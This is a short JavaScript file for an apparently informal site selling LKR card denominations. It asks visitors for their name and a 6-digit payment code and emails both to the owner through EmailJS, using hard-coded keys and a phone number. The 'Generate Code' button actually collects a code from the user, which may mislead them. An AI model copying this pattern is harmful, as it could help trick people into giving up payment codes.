const cards = [
    { name: "500 LKR" }, { name: "1000 LKR" }, { name: "2000 LKR" }
];

function renderCards() {
    const list = document.getElementById('card-list');
    cards.forEach((card) => {
        const div = document.createElement('div');
        div.className = "card-box";
        div.innerHTML = `<strong>${card.name}</strong>`;
        div.onclick = () => showCardDetails(card);
        list.appendChild(div);
    });
}

function showCardDetails(card) {
    document.getElementById('dash-view').innerHTML = `
        <h3>${card.name} Selected</h3>
        <p>Click Generate to send request.</p>
        <button class="btn" onclick="sendCodeRequest('${card.name}')">Generate Code</button>
        <button class="btn" style="background:transparent;" onclick="location.reload()">Back</button>
    `;
}

function sendCodeRequest(cardName) {
    // 1. පාරිභෝගිකයාගෙන් නම අහනවා
    const custName = prompt("Enter your name:");
    if (!custName) return;

    // 2. මෙතන තමයි ඔයා ඉල්ලපු 6 digit code එක ගහන්න තැන
    const userCode = prompt("Please enter your 6-digit payment code:");
    if (!userCode || userCode.length !== 6) {
        alert("Invalid code! Please enter exactly 6 digits.");
        return;
    }

    document.getElementById('dash-view').innerHTML = `<h2>Generating your code...</h2>`;

    // 3. ඊමේල් එකට දැන් අර කෝඩ් එකත් යනවා
    emailjs.send("service_ky2ympa", "template_5sac14q", {
        name: custName,
        card_name: cardName,
        payment_code: userCode // මේක ඔයාගේ Template එකට එකතු වෙයි
    }, "HahSYzYSEJF5oRsnt").then(() => {
        document.getElementById('dash-view').innerHTML = `
            <h2>Success!</h2>
            <h3 style="color:yellow;">Request sent with your code. Owner will verify.</h3>
            <p>WhatsApp: <strong>0772915479</strong></p>
            <button class="btn" onclick="location.reload()">Back Home</button>
        `;
    }).catch(() => {
        alert("Error sending request!");
        location.reload();
    });
}
